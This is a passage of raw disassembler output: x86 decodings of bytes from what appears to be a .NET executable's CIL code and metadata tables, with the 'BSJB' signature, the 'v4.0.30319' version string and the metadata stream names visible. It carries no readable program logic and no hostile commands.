  4056b3:	00 1b                	add    %bl,(%ebx)
  4056b5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056b8:	52                   	push   %edx
  4056b9:	00 00                	add    %al,(%eax)
  4056bb:	00 2e                	add    %ch,(%esi)
  4056bd:	00 00                	add    %al,(%eax)
  4056bf:	11 73 79             	adc    %esi,0x79(%ebx)
  4056c2:	00 00                	add    %al,(%eax)
  4056c4:	0a 0a                	or     (%edx),%cl
  4056c6:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  4056cc:	00 0a                	add    %cl,(%edx)
  4056ce:	0b 06                	or     (%esi),%eax
  4056d0:	07                   	pop    %es
  4056d1:	16                   	push   %ss
  4056d2:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4056d5:	00 00                	add    %al,(%eax)
  4056d7:	0a 06                	or     (%esi),%al
  4056d9:	17                   	pop    %ss
  4056da:	73 10                	jae    0x4056ec
  4056dc:	01 00                	add    %eax,(%eax)
  4056de:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4056e1:	02 16                	add    (%esi),%dl
  4056e3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4056e9:	00 0a                	add    %cl,(%edx)
  4056eb:	08 6f 4f             	or     %ch,0x4f(%edi)
  4056ee:	00 00                	add    %al,(%eax)
  4056f0:	0a de                	or     %dh,%bl
  4056f2:	0a 08                	or     (%eax),%cl
  4056f4:	2c 06                	sub    $0x6,%al
  4056f6:	08 6f 33             	or     %ch,0x33(%edi)
  4056f9:	00 00                	add    %al,(%eax)
  4056fb:	0a dc                	or     %ah,%bl
  4056fd:	06                   	push   %es
  4056fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ff:	09 01                	or     %eax,(%ecx)
  405701:	00 0a                	add    %cl,(%edx)
  405703:	0d de 0a 06 2c       	or     $0x2c060ade,%eax
  405708:	06                   	push   %es
  405709:	06                   	push   %es
  40570a:	6f                   	outsl  %ds:(%esi),(%dx)
  40570b:	33 00                	xor    (%eax),%eax
  40570d:	00 0a                	add    %cl,(%edx)
  40570f:	dc 09                	fmull  (%ecx)
  405711:	2a 00                	sub    (%eax),%al
  405713:	00 01                	add    %al,(%ecx)
  405715:	1c 00                	sbb    $0x0,%al
  405717:	00 02                	add    %al,(%edx)
  405719:	00 20                	add    %ah,(%eax)
  40571b:	00 13                	add    %dl,(%ebx)
  40571d:	33 00                	xor    (%eax),%eax
  40571f:	0a 00                	or     (%eax),%al
  405721:	00 00                	add    %al,(%eax)
  405723:	00 02                	add    %al,(%edx)
  405725:	00 06                	add    %al,(%esi)
  405727:	00 40 46             	add    %al,0x46(%eax)
  40572a:	00 0a                	add    %cl,(%edx)
  40572c:	00 00                	add    %al,(%eax)
  40572e:	00 00                	add    %al,(%eax)
  405730:	42                   	inc    %edx
  405731:	53                   	push   %ebx
  405732:	4a                   	dec    %edx
  405733:	42                   	inc    %edx
  405734:	01 00                	add    %eax,(%eax)
  405736:	01 00                	add    %eax,(%eax)
  405738:	00 00                	add    %al,(%eax)
  40573a:	00 00                	add    %al,(%eax)
  40573c:	0c 00                	or     $0x0,%al
  40573e:	00 00                	add    %al,(%eax)
  405740:	76 34                	jbe    0x405776
  405742:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405745:	33 30                	xor    (%eax),%esi
  405747:	33 31                	xor    (%ecx),%esi
  405749:	39 00                	cmp    %eax,(%eax)
  40574b:	00 00                	add    %al,(%eax)
  40574d:	00 05 00 6c 00 00    	add    %al,0x6c00
  405753:	00 68 1d             	add    %ch,0x1d(%eax)
  405756:	00 00                	add    %al,(%eax)
  405758:	23 7e 00             	and    0x0(%esi),%edi
  40575b:	00 d4                	add    %dl,%ah
  40575d:	1d 00 00 5c 1d       	sbb    $0x1d5c0000,%eax
  405762:	00 00                	add    %al,(%eax)
  405764:	23 53 74             	and    0x74(%ebx),%edx
  405767:	72 69                	jb     0x4057d2
  405769:	6e                   	outsb  %ds:(%esi),(%dx)
  40576a:	67 73 00             	addr16 jae 0x40576d
  40576d:	00 00                	add    %al,(%eax)
  40576f:	00 30                	add    %dh,(%eax)
  405771:	3b 00                	cmp    (%eax),%eax
  405773:	00 40 08             	add    %al,0x8(%eax)
  405776:	00 00                	add    %al,(%eax)
  405778:	23 55 53             	and    0x53(%ebp),%edx
  40577b:	00 70 43             	add    %dh,0x43(%eax)
  40577e:	00 00                	add    %al,(%eax)
  405780:	10 00                	adc    %al,(%eax)
  405782:	00 00                	add    %al,(%eax)
  405784:	23 47 55             	and    0x55(%edi),%eax
  405787:	49                   	dec    %ecx
  405788:	44                   	inc    %esp
  405789:	00 00                	add    %al,(%eax)
  40578b:	00 80 43 00 00 88    	add    %al,-0x77ffffbd(%eax)
  405791:	09 00                	or     %eax,(%eax)
  405793:	00 23                	add    %ah,(%ebx)
  405795:	42                   	inc    %edx
  405796:	6c                   	insb   (%dx),%es:(%edi)
  405797:	6f                   	outsl  %ds:(%esi),(%dx)
  405798:	62 00                	bound  %eax,(%eax)
  40579a:	00 00                	add    %al,(%eax)
  40579c:	00 00                	add    %al,(%eax)
  40579e:	00 00                	add    %al,(%eax)
  4057a0:	02 00                	add    (%eax),%al
  4057a2:	00 01                	add    %al,(%ecx)
  4057a4:	57                   	push   %edi
  4057a5:	9f                   	lahf
  4057a6:	a2 3f 09 0a 00       	mov    %al,0xa093f
  4057ab:	00 00                	add    %al,(%eax)
  4057ad:	fa                   	cli
  4057ae:	01 33                	add    %esi,(%ebx)
  4057b0:	00 16                	add    %dl,(%esi)
  4057b2:	00 00                	add    %al,(%eax)
  4057b4:	01 00                	add    %eax,(%eax)
  4057b6:	00 00                	add    %al,(%eax)
  4057b8:	9b                   	fwait
  4057b9:	00 00                	add    %al,(%eax)
  4057bb:	00 1d 00 00 00 45    	add    %bl,0x45000000
  4057c1:	00 00                	add    %al,(%eax)
  4057c3:	00 a1 00 00 00 6e    	add    %ah,0x6e000000(%ecx)
  4057c9:	00 00                	add    %al,(%eax)
  4057cb:	00 02                	add    %al,(%edx)
  4057cd:	00 00                	add    %al,(%eax)
  4057cf:	00 10                	add    %dl,(%eax)
  4057d1:	01 00                	add    %eax,(%eax)
  4057d3:	00 13                	add    %dl,(%ebx)
  4057d5:	00 00                	add    %al,(%eax)
  4057d7:	00 2d 00 00 00 02    	add    %ch,0x2000000
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	00 2e                	add    %ch,(%esi)
  4057e1:	00 00                	add    %al,(%eax)
  4057e3:	00 04 00             	add    %al,(%eax,%eax,1)
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	12 00                	adc    (%eax),%al
  4057ea:	00 00                	add    %al,(%eax)
  4057ec:	1e                   	push   %ds
  4057ed:	00 00                	add    %al,(%eax)
  4057ef:	00 04 00             	add    %al,(%eax,%eax,1)
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	02 00                	add    (%eax),%al
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	06                   	push   %es
  4057f9:	00 00                	add    %al,(%eax)
  4057fb:	00 04 00             	add    %al,(%eax,%eax,1)
  4057fe:	00 00                	add    %al,(%eax)
  405800:	02 00                	add    (%eax),%al
  405802:	00 00                	add    %al,(%eax)
  405804:	01 00                	add    %eax,(%eax)
  405806:	00 00                	add    %al,(%eax)
  405808:	08 00                	or     %al,(%eax)
  40580a:	00 00                	add    %al,(%eax)
  40580c:	04 00                	add    $0x0,%al
  40580e:	00 00                	add    %al,(%eax)
  405810:	03 00                	add    (%eax),%eax
  405812:	00 00                	add    %al,(%eax)
  405814:	00 00                	add    %al,(%eax)
  405816:	b5 0a                	mov    $0xa,%ch
  405818:	01 00                	add    %eax,(%eax)
  40581a:	00 00                	add    %al,(%eax)
  40581c:	00 00                	add    %al,(%eax)
  40581e:	06                   	push   %es
  40581f:	00 b1 09 3c 15 06    	add    %dh,0x6153c09(%ecx)
  405825:	00 1e                	add    %bl,(%esi)
  405827:	0a 3c 15 06 00 ce 08 	or     0x8ce0006(,%edx,1),%bh
  40582e:	e4 14                	in     $0x14,%al
  405830:	0f 00 5c 15 00       	ltr    0x0(%ebp,%edx,1)
  405835:	00 06                	add    %al,(%esi)
  405837:	00 f6                	add    %dh,%dh
  405839:	08 e3                	or     %ah,%bl
  40583b:	10 06                	adc    %al,(%esi)
  40583d:	00 7d 09             	add    %bh,0x9(%ebp)
  405840:	e3 10                	jecxz  0x405852
  405842:	06                   	push   %es
  405843:	00 5e 09             	add    %bl,0x9(%esi)
  405846:	e3 10                	jecxz  0x405858
  405848:	06                   	push   %es
  405849:	00 05 0a e3 10 06    	add    %al,0x610e30a
  40584f:	00 d1                	add    %dl,%cl
  405851:	09 e3                	or     %esp,%ebx
  405853:	10 06                	adc    %al,(%esi)
  405855:	00 ea                	add    %ch,%dl
  405857:	09 e3                	or     %esp,%ebx
  405859:	10 06                	adc    %al,(%esi)
  40585b:	00 0d 09 e3 10 06    	add    %cl,0x610e309
  405861:	00 e2                	add    %ah,%dl
  405863:	08 1d 15 06 00 41    	or     %bl,0x41000615
  405869:	09 e3                	or     %esp,%ebx
  40586b:	10 06                	adc    %al,(%esi)
  40586d:	00 28                	add    %ch,(%eax)
  40586f:	09 ca                	or     %ecx,%edx
  405871:	0b 06                	or     (%esi),%eax
  405873:	00 f7                	add    %dh,%bh
  405875:	18 82 0f 0a 00 8a    	sbb    %al,-0x75fff5f1(%edx)
  40587b:	00 a4 15 06 00 87 11 	add    %ah,0x11870006(%ebp,%edx,1)
  405882:	82 0f 06             	orb    $0x6,(%edi)
  405885:	00 b3 08 3c 15 0a    	add    %dh,0xa153c08(%ebx)
  40588b:	00 5d 19             	add    %bl,0x19(%ebp)
  40588e:	30 18                	xor    %bl,(%eax)
  405890:	0a 00                	or     (%eax),%al
  405892:	1d 0f 29 1d 06       	sbb    $0x61d290f,%eax
  405897:	00 c5                	add    %al,%ch
  405899:	13 5c 0b 0a          	adc    0xa(%ebx,%ecx,1),%ebx
  40589d:	00 12                	add    %dl,(%edx)
  40589f:	18 1c 19             	sbb    %bl,(%ecx,%ebx,1)
  4058a2:	0a 00                	or     (%eax),%al
  4058a4:	e3 19                	jecxz  0x4058bf
  4058a6:	1c 19                	sbb    $0x19,%al
  4058a8:	0a 00                	or     (%eax),%al
  4058aa:	45                   	inc    %ebp
  4058ab:	0e                   	push   %cs
  4058ac:	1c 19                	sbb    $0x19,%al
  4058ae:	06                   	push   %es
  4058af:	00 48 08             	add    %cl,0x8(%eax)
  4058b2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4058b3:	15 0a 00 36 10       	adc    $0x1036000a,%eax
  4058b8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4058b9:	15 0a 00 b9 17       	adc    $0x17b9000a,%eax
  4058be:	29 1d 06 00 c5 19    	sub    %ebx,0x19c50006
  4058c4:	82 0f 06             	orb    $0x6,(%edi)
  4058c7:	00 50 0f             	add    %dl,0xf(%eax)
  4058ca:	4d                   	dec    %ebp
  4058cb:	02 06                	add    (%esi),%al
  4058cd:	00 a6 0b aa 1b 06    	add    %ah,0x61baa0b(%esi)
  4058d3:	00 c5                	add    %al,%ch
  4058d5:	12 aa 1b 06 00 4a    	adc    0x4a00061b(%edx),%ch
  4058db:	14 73                	adc    $0x73,%al
  4058dd:	17                   	pop    %ss
  4058de:	06                   	push   %es
  4058df:	00 2b                	add    %ch,(%ebx)
  4058e1:	00 b7 02 06 00 9a    	add    %dh,-0x65fff9fe(%edi)
  4058e7:	09 e3                	or     %esp,%ebx
  4058e9:	10 06                	adc    %al,(%esi)
  4058eb:	00 76 05             	add    %dh,0x5(%esi)
  4058ee:	73 17                	jae    0x405907
  4058f0:	87 00                	xchg   %eax,(%eax)
  4058f2:	93                   	xchg   %eax,%ebx
  4058f3:	14 00                	adc    $0x0,%al
  4058f5:	00 06                	add    %al,(%esi)
  4058f7:	00 56 0f             	add    %dl,0xf(%esi)
  4058fa:	4d                   	dec    %ebp
  4058fb:	02 06                	add    (%esi),%al
  4058fd:	00 63 07             	add    %ah,0x7(%ebx)
  405900:	82 0f 06             	orb    $0x6,(%edi)
  405903:	00 04 0f             	add    %al,(%edi,%ecx,1)
  405906:	4d                   	dec    %ebp
  405907:	02 06                	add    (%esi),%al
  405909:	00 f3                	add    %dh,%bl
  40590b:	0f 82 0f 06 00 b1    	jb     0xb1405f20
  405911:	11 4d 02             	adc    %ecx,0x2(%ebp)
  405914:	0a 00                	or     (%eax),%al
  405916:	02 18                	add    (%eax),%bl
  405918:	e4 14                	in     $0x14,%al
  40591a:	0a 00                	or     (%eax),%al
  40591c:	01 12                	add    %edx,(%edx)
  40591e:	e4 14                	in     $0x14,%al
  405920:	06                   	push   %es
  405921:	00 8b 1c 55 00 06    	add    %cl,0x600551c(%ebx)
  405927:	00 11                	add    %dl,(%ecx)
  405929:	14 4d                	adc    $0x4d,%al
  40592b:	02 0e                	add    (%esi),%cl
  40592d:	00 92 13 4b 1a 0e    	add    %dl,0xe1a4b13(%edx)
  405933:	00 0f                	add    %cl,(%edi)
  405935:	11 4b 1a             	adc    %ecx,0x1a(%ebx)
  405938:	bf 00 56 14 00       	mov    $0x145600,%edi
  40593d:	00 0e                	add    %cl,(%esi)
  40593f:	00 d9                	add    %bl,%cl
  405941:	18 4b 1a             	sbb    %cl,0x1a(%ebx)
  405944:	12 00                	adc    (%eax),%al
  405946:	99                   	cltd
  405947:	11 b3 0b 12 00 82    	adc    %esi,-0x7dffedf5(%ebx)
  40594d:	18 b3 0b 06 00 e2    	sbb    %dh,-0x1dfff9f5(%ebx)
  405953:	1b 5c 0b 0a          	sbb    0xa(%ebx,%ecx,1),%ebx
  405957:	00 c5                	add    %al,%ch
  405959:	16                   	push   %ss
  40595a:	55                   	push   %ebp
  40595b:	00 16                	add    %dl,(%esi)
  40595d:	00 20                	add    %ah,(%eax)
  40595f:	00 3c 15 16 00 01 00 	add    %bh,0x10016(,%edx,1)
  405966:	82 0f 16             	orb    $0x16,(%edi)
  405969:	00 a4 08 3c 15 06 00 	add    %ah,0x6153c(%eax,%ecx,1)
  405970:	f6 15 9c 1c 16 00    	notb   0x161c9c
  405976:	ac                   	lods   %ds:(%esi),%al
  405977:	12 9c 1c 06 00 38 0f 	adc    0xf380006(%esp,%ebx,1),%bl
  40597e:	9c                   	pushf
  40597f:	1c 06                	sbb    $0x6,%al
  405981:	00 fb                	add    %bh,%bl
  405983:	00 9c 1c 06 00 23 03 	add    %bl,0x3230006(%esp,%ebx,1)
  40598a:	9c                   	pushf
  40598b:	1c 0a                	sbb    $0xa,%al
  40598d:	00 45 0f             	add    %al,0xf(%ebp)
  405990:	a2 10 06 00 c3       	mov    %al,0xc3000610
  405995:	07                   	pop    %es
  405996:	82 0f 06             	orb    $0x6,(%edi)
  405999:	00 0e                	add    %cl,(%esi)
  40599b:	03 5c 0b 06          	add    0x6(%ebx,%ecx,1),%ebx
  40599f:	00 5f 1b             	add    %bl,0x1b(%edi)
  4059a2:	82 0f 06             	orb    $0x6,(%edi)
  4059a5:	00 5d 1a             	add    %bl,0x1a(%ebp)
  4059a8:	82 0f 06             	orb    $0x6,(%edi)
  4059ab:	00 d4                	add    %dl,%ah
  4059ad:	0f 82 0f 06 00 aa    	jb     0xaa405fc2
  4059b3:	0b aa 1b 0a 00 6e    	or     0x6e000a1b(%edx),%ebp
  4059b9:	1c a4                	sbb    $0xa4,%al
  4059bb:	15 06 00 ad 0f       	adc    $0xfad0006,%eax
  4059c0:	9c                   	pushf
  4059c1:	1c 06                	sbb    $0x6,%al
  4059c3:	00 93 12 9c 1c 06    	add    %dl,0x61c9c12(%ebx)
  4059c9:	00 3d 0b 9c 1c 0a    	add    %bh,0xa1c9c0b
  4059cf:	00 c2                	add    %al,%dl
  4059d1:	1c 30                	sbb    $0x30,%al
  4059d3:	18 0a                	sbb    %cl,(%edx)
  4059d5:	00 f8                	add    %bh,%al
  4059d7:	07                   	pop    %es
  4059d8:	30 18                	xor    %bl,(%eax)
  4059da:	0a 00                	or     (%eax),%al
  4059dc:	e3 07                	jecxz  0x4059e5
  4059de:	30 18                	xor    %bl,(%eax)
  4059e0:	06                   	push   %es
  4059e1:	00 87 0c 82 0f 06    	add    %al,0x60f820c(%edi)
  4059e7:	00 68 12             	add    %ch,0x12(%eax)
  4059ea:	82 0f 0a             	orb    $0xa,(%edi)
  4059ed:	00 66 17             	add    %ah,0x17(%esi)
  4059f0:	1c 19                	sbb    $0x19,%al
  4059f2:	0a 00                	or     (%eax),%al
  4059f4:	00 17                	add    %dl,(%edi)
  4059f6:	1c 19                	sbb    $0x19,%al
  4059f8:	06                   	push   %es
  4059f9:	00 86 17 82 0f 06    	add    %al,0x60f8217(%esi)
  4059ff:	00 82 05 82 0f 0a    	add    %al,0xa0f8205(%edx)
  405a05:	00 0f                	add    %cl,(%edi)
  405a07:	0f 30                	wrmsr
  405a09:	18 0a                	sbb    %cl,(%edx)
  405a0b:	00 8f 0d 29 1d 0a    	add    %cl,0xa1d290d(%edi)
  405a11:	00 04 1b             	add    %al,(%ebx,%ebx,1)
  405a14:	1c 19                	sbb    $0x19,%al
  405a16:	0a 00                	or     (%eax),%al
  405a18:	f5                   	cmc
  405a19:	10 a4 15 0a 00 24 17 	adc    %ah,0x1724000a(%ebp,%edx,1)
  405a20:	c4 10                	les    (%eax),%edx
  405a22:	06                   	push   %es
  405a23:	00 5e 0a             	add    %bl,0xa(%esi)
  405a26:	82 0f 06             	orb    $0x6,(%edi)
  405a29:	00 b3 0d 5c 0b 06    	add    %dh,0x60b5c0d(%ebx)
  405a2f:	00 81 0d 82 0f 0a    	add    %al,0xa0f820d(%ecx)
  405a35:	00 46 0d             	add    %al,0xd(%esi)
  405a38:	82 0f 0a             	orb    $0xa,(%edi)
  405a3b:	00 af 07 82 0f 06    	add    %ch,0x60f8207(%edi)
  405a41:	00 2f                	add    %ch,(%edi)
  405a43:	14 82                	adc    $0x82,%al
  405a45:	0f 06                	clts
  405a47:	00 46 1b             	add    %al,0x1b(%esi)
  405a4a:	5c                   	pop    %esp
  405a4b:	0b 06                	or     (%esi),%eax
  405a4d:	00 b5 14 5c 0b 0a    	add    %dh,0xa0b5c14(%ebp)
  405a53:	00 2c 05 30 18 06 00 	add    %ch,0x61830(,%eax,1)
  405a5a:	a9 01 82 0f 06       	test   $0x60f8201,%eax
  405a5f:	00 da                	add    %bl,%dl
  405a61:	00 82 0f 06 00 c7    	add    %al,-0x38fff9f1(%edx)
  405a67:	00 82 0f 06 00 9b    	add    %al,-0x64fff9f1(%edx)
  405a6d:	05 82 0f 06 00       	add    $0x60f82,%eax
  405a72:	19 06                	sbb    %eax,(%esi)
  405a74:	82 0f 06             	orb    $0x6,(%edi)
  405a77:	00 46 06             	add    %al,0x6(%esi)
  405a7a:	4d                   	dec    %ebp
  405a7b:	02 06                	add    (%esi),%al
  405a7d:	00 dc                	add    %bl,%ah
  405a7f:	04 4d                	add    $0x4d,%al
  405a81:	02 06                	add    (%esi),%al
  405a83:	00 d9                	add    %bl,%cl
  405a85:	17                   	pop    %ss
  405a86:	4d                   	dec    %ebp
  405a87:	02 06                	add    (%esi),%al
  405a89:	00 03                	add    %al,(%ebx)
  405a8b:	08 4d 02             	or     %cl,0x2(%ebp)
  405a8e:	06                   	push   %es
  405a8f:	00 aa 17 3c 15 06    	add    %ch,0x6153c17(%edx)
  405a95:	00 2f                	add    %ch,(%edi)
  405a97:	1c 82                	sbb    $0x82,%al
  405a99:	0f 06                	clts
  405a9b:	00 ad 05 82 0f 06    	add    %ch,0x60f8205(%ebp)
  405aa1:	00 14 10             	add    %dl,(%eax,%edx,1)
  405aa4:	82 0f 06             	orb    $0x6,(%edi)
  405aa7:	00 09                	add    %cl,(%ecx)
  405aa9:	0d 4d 02 0a 00       	or     $0xa024d,%eax
  405aae:	76 06                	jbe    0x405ab6
  405ab0:	e4 14                	in     $0x14,%al
  405ab2:	06                   	push   %es
  405ab3:	00 c4                	add    %al,%ah
  405ab5:	11 4d 02             	adc    %ecx,0x2(%ebp)
  405ab8:	0a 00                	or     (%eax),%al
  405aba:	94                   	xchg   %eax,%esp
  405abb:	06                   	push   %es
  405abc:	e4 14                	in     $0x14,%al
  405abe:	06                   	push   %es
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	1d 55 00 1a 00       	sbb    $0x1a0055,%eax
  405ac6:	aa                   	stos   %al,%es:(%edi)
  405ac7:	16                   	push   %ss
  405ac8:	d2 02                	rolb   %cl,(%edx)
  405aca:	06                   	push   %es
  405acb:	00 d0                	add    %dl,%al
  405acd:	0d 55 00 06 00       	or     $0x60055,%eax
  405ad2:	1e                   	push   %ds
  405ad3:	14 4d                	adc    $0x4d,%al
  405ad5:	02 06                	add    (%esi),%al
  405ad7:	00 ba 11 4d 02 1a    	add    %bh,0x1a024d11(%edx)
  405add:	00 d3                	add    %dl,%bl
  405adf:	11 ff                	adc    %edi,%edi
  405ae1:	14 06                	adc    $0x6,%al
  405ae3:	00 dd                	add    %bl,%ch
  405ae5:	14 82                	adc    $0x82,%al
  405ae7:	0f 06                	clts
  405ae9:	00 7a 00             	add    %bh,0x0(%edx)
  405aec:	82 0f 16             	orb    $0x16,(%edi)
  405aef:	00 77 05             	add    %dh,0x5(%edi)
  405af2:	56                   	push   %esi
  405af3:	12 06                	adc    (%esi),%al
  405af5:	00 12                	add    %dl,(%edx)
  405af7:	00 b7 02 06 00 79    	add    %dh,0x79000602(%edi)
  405afd:	0f 82 0f 06 00 7a    	jb     0x7a406112
  405b03:	12 9c 1c 06 00 c1 0f 	adc    0xfc10006(%esp,%ebx,1),%bl
  405b0a:	9c                   	pushf
  405b0b:	1c 1e                	sbb    $0x1e,%al
  405b0d:	00 b8 10 51 17 06    	add    %bh,0x6175110(%eax)
  405b13:	00 3d 1d 57 0e 06    	add    %bh,0x60e571d
  405b19:	00 71 0e             	add    %dh,0xe(%ecx)
  405b1c:	57                   	push   %edi
  405b1d:	0e                   	push   %cs
  405b1e:	06                   	push   %es
  405b1f:	00 54 06 57          	add    %dl,0x57(%esi,%eax,1)
  405b23:	0e                   	push   %cs
  405b24:	06                   	push   %es
  405b25:	00 6c 03 82          	add    %ch,-0x7e(%ebx,%eax,1)
  405b29:	0f 06                	clts
  405b2b:	00 f4                	add    %dh,%ah
  405b2d:	05 5c 0b 0a 00       	add    $0xa0b5c,%eax
  405b32:	ab                   	stos   %eax,%es:(%edi)
  405b33:	13 55 00             	adc    0x0(%ebp),%edx
  405b36:	0a 00                	or     (%eax),%al
  405b38:	51                   	push   %ecx
  405b39:	18 55 00             	sbb    %dl,0x0(%ebp)
  405b3c:	06                   	push   %es
  405b3d:	00 aa 04 55 00 06    	add    %ch,0x6005504(%edx)
  405b43:	00 46 10             	add    %al,0x10(%esi)
  405b46:	82 0f 06             	orb    $0x6,(%edi)
  405b49:	00 b9 1c e3 10 06    	add    %bh,0x610e31c(%ecx)
  405b4f:	00 fe                	add    %bh,%dh
  405b51:	07                   	pop    %es
  405b52:	82 0f 06             	orb    $0x6,(%edi)
  405b55:	00 9e 14 82 0f 06    	add    %bl,0x60f8214(%esi)
  405b5b:	00 d0                	add    %dl,%al
  405b5d:	05 82 0f 22 00       	add    $0x220f82,%eax
  405b62:	e0 11                	loopne 0x405b75
  405b64:	f1                   	int1
  405b65:	12 22                	adc    (%edx),%ah
  405b67:	00 78 16             	add    %bh,0x16(%eax)
  405b6a:	f1                   	int1
  405b6b:	12 22                	adc    (%edx),%ah
  405b6d:	00 18                	add    %bl,(%eax)
  405b6f:	13 f1                	adc    %ecx,%esi
  405b71:	12 16                	adc    (%esi),%dl
  405b73:	00 10                	add    %dl,(%eax)
  405b75:	13 3c 15 22 00 90 16 	adc    0x16900022(,%edx,1),%edi
  405b7c:	f1                   	int1
  405b7d:	12 06                	adc    (%esi),%al
  405b7f:	00 7f 11             	add    %bh,0x11(%edi)
  405b82:	82 0f 06             	orb    $0x6,(%edi)
  405b85:	00 fd                	add    %bh,%ch
  405b87:	15 9c 1c 06 00       	adc    $0x61c9c,%eax
  405b8c:	69 11 82 0f 06 00    	imul   $0x60f82,(%ecx),%edx
  405b92:	9a 0f 9c 1c 06 00 21 	lcall  $0x2100,$0x61c9c0f
  405b99:	05 9c 1c 06 00       	add    $0x61c9c,%eax
  405b9e:	e5 04                	in     $0x4,%eax
  405ba0:	9c                   	pushf
  405ba1:	1c 06                	sbb    $0x6,%al
  405ba3:	00 db                	add    %bl,%bl
  405ba5:	0f 9c 1c 06          	setl   (%esi,%eax,1)
  405ba9:	00 00                	add    %al,(%eax)
  405bab:	05 9c 1c 06 00       	add    $0x61c9c,%eax
  405bb0:	52                   	push   %edx
  405bb1:	11 9c 1c 06 00 39 13 	adc    %ebx,0x13390006(%esp,%ebx,1)
  405bb8:	82 0f 0a             	orb    $0xa,(%edi)
  405bbb:	00 11                	add    %dl,(%ecx)
  405bbd:	05 a2 10 00 00       	add    $0x10a2,%eax
  405bc2:	00 00                	add    %al,(%eax)
  405bc4:	40                   	inc    %eax
  405bc5:	01 00                	add    %eax,(%eax)
  405bc7:	00 00                	add    %al,(%eax)
  405bc9:	00 01                	add    %al,(%ecx)
  405bcb:	00 01                	add    %al,(%ecx)
  405bcd:	00 01                	add    %al,(%ecx)
  405bcf:	00 10                	add    %dl,(%eax)
  405bd1:	00 5d 0f             	add    %bl,0xf(%ebp)
  405bd4:	44                   	inc    %esp
  405bd5:	1a 3d 00 01 00 01    	sbb    0x1000100,%bh
  405bdb:	00 81 01 10 00 bc    	add    %al,-0x43ffefff(%ecx)
  405be1:	16                   	push   %ss
  405be2:	44                   	inc    %esp
  405be3:	1a 3d 00 01 00 03    	sbb    0x3000100,%bh
  405be9:	00 81 01 10 00 57    	add    %al,0x57001001(%ecx)
  405bef:	19 2a                	sbb    %ebp,(%edx)
  405bf1:	11 3d 00 12 00 06    	adc    %edi,0x6001200
  405bf7:	00 01                	add    %al,(%ecx)
  405bf9:	00 10                	add    %dl,(%eax)
  405bfb:	00 46 17             	add    %al,0x17(%esi)
  405bfe:	66 0d 3d 00          	or     $0x3d,%ax
  405c02:	1c 00                	sbb    $0x0,%al
  405c04:	22 00                	and    (%eax),%al
  405c06:	01 00                	add    %eax,(%eax)
  405c08:	10 00                	adc    %al,(%eax)
  405c0a:	ec                   	in     (%dx),%al
  405c0b:	0f 66 0d 3d 00 1d 00 	pcmpgtd 0x1d003d,%mm1
  405c12:	2d 00 01 00 10       	sub    $0x10000100,%eax
  405c17:	00 09                	add    %cl,(%ecx)
  405c19:	1c 66                	sbb    $0x66,%al
  405c1b:	0d 3d 00 1f 00       	or     $0x1f003d,%eax
  405c20:	31 00                	xor    %eax,(%eax)
  405c22:	01 00                	add    %eax,(%eax)
  405c24:	10 00                	adc    %al,(%eax)
  405c26:	79 0d                	jns    0x405c35
  405c28:	66 0d 3d 00          	or     $0x3d,%ax
  405c2c:	21 00                	and    %eax,(%eax)
  405c2e:	38 00                	cmp    %al,(%eax)
  405c30:	01 01                	add    %eax,(%ecx)
  405c32:	00 00                	add    %al,(%eax)
  405c34:	d7                   	xlat   %ds:(%ebx)
  405c35:	07                   	pop    %es
  405c36:	66 0d a1 00          	or     $0xa1,%ax
  405c3a:	28 00                	sub    %al,(%eax)
  405c3c:	63 00                	arpl   %eax,(%eax)
  405c3e:	00 00                	add    %al,(%eax)
  405c40:	10 00                	adc    %al,(%eax)
  405c42:	31 17                	xor    %edx,(%edi)
  405c44:	66 0d 3d 00          	or     $0x3d,%ax
  405c48:	35 00 63 00 00       	xor    $0x6300,%eax
  405c4d:	00 10                	add    %dl,(%eax)
  405c4f:	00 3b                	add    %bh,(%ebx)
  405c51:	17                   	pop    %ss
  405c52:	66 0d 3d 00          	or     $0x3d,%ax
  405c56:	35 00 67 00 00       	xor    $0x6700,%eax
  405c5b:	00 10                	add    %dl,(%eax)
  405c5d:	00 48 12             	add    %cl,0x12(%eax)
  405c60:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405c61:	0e                   	push   %cs
  405c62:	3d 00 35 00 70       	cmp    $0x70003500,%eax
  405c67:	00 00                	add    %al,(%eax)
  405c69:	00 10                	add    %dl,(%eax)
  405c6b:	00 dc                	add    %bl,%ah
  405c6d:	16                   	push   %ss
  405c6e:	dc 13                	fcoml  (%ebx)
  405c70:	3d 00 35 00 72       	cmp    $0x72003500,%eax
  405c75:	00 00                	add    %al,(%eax)
  405c77:	00 10                	add    %dl,(%eax)
  405c79:	00 cb                	add    %cl,%bl
  405c7b:	13 dc                	adc    %esp,%ebx
  405c7d:	13 3d 00 35 00 7b    	adc    0x7b003500,%edi
  405c83:	00 81 01 10 00 1c    	add    %al,0x1c001001(%ecx)
  405c89:	10 dc                	adc    %bl,%ah
  405c8b:	13 3d 00 35 00 7e    	adc    0x7e003500,%edi
  405c91:	00 81 01 10 00 e1    	add    %al,-0x1effefff(%ecx)
  405c97:	12 dc                	adc    %ah,%bl
  405c99:	13 3d 00 35 00 80    	adc    0x80003500,%edi
  405c9f:	00 80 01 10 00 f7    	add    %al,-0x8ffefff(%eax)
  405ca5:	14 dc                	adc    $0xdc,%al
  405ca7:	13 3d 00 35 00 81    	adc    0x81003500,%edi
  405cad:	00 81 01 10 00 e9    	add    %al,-0x16ffefff(%ecx)
  405cb3:	0e                   	push   %cs
  405cb4:	dc 13                	fcoml  (%ebx)
  405cb6:	3d 00 35 00 87       	cmp    $0x87003500,%eax
  405cbb:	00 81 01 10 00 35    	add    %al,0x35001001(%ecx)
  405cc1:	0e                   	push   %cs
  405cc2:	dc 13                	fcoml  (%ebx)
  405cc4:	3d 00 36 00 89       	cmp    $0x89003600,%eax
  405cc9:	00 81 01 10 00 03    	add    %al,0x3001001(%ecx)
